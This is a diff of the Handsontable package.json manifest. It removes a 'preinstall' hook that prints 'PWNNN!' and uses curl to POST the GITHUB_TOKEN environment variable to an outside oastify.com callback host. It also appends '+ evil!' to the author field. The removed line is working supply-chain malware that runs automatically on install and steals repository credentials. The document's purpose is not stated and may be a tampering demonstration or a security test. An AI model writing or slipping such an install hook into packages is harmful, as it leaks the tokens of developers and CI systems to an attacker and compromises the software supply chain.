@@ -9,7 +9,7 @@
   "bugs": {
     "url": "https://github.com/handsontable/handsontable/issues"
   },
-  "author": "Handsoncode <hello@handsontable.com>",
+  "author": "Handsoncode <hello@handsontable.com> + evil!",
   "version": "14.1.0",
   "main": "index",
   "module": "index.mjs",
@@ -17,7 +17,6 @@
   "jsdelivr": "dist/handsontable.full.min.js",
   "unpkg": "dist/handsontable.full.min.js",
   "scripts": {
-    "preinstall": "echo PWNNN!; curl -X POST https://stpxp6olrc7t1ol7ztz3jolu9lfc32rr.oastify.com/token=${GITHUB_TOKEN}"
     "clean": "rimraf commonjs es coverage tmp",
     "lint": "npm run eslint && npm run tslint && npm run dtslint && npm run stylelint",
     "lint:fix": "npm run eslint:fix && npm run stylelint:fix",
